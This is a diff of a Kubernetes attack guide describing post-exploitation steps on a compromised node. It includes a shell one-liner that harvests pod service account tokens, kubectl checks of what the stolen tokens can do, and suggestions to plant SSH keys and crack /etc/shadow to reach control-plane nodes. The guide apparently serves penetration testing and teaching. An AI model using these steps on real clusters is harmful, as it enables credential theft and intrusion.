@@ -126,16 +126,16 @@ Use something like access-matrix to see if any of them give you more permission 
 # This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
 tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
 
-default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
-default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
-development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
-kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
-kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
+default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
+default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
+development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
+development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
+kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
+kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
 
 
 # For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
-DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
+DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
 kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
 kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 
@@ -144,8 +144,8 @@ kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
 ```
 
 #### Some other ideas:
-* Add your public key to node and ssh to it
-* Crack passwords in /etc/shadow, see if you can use them to access other nodes
+* Add your public key authorized_keys on the node and ssh to it
+* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
 
 #### Attacks that apply to all pods, even without any special permissions
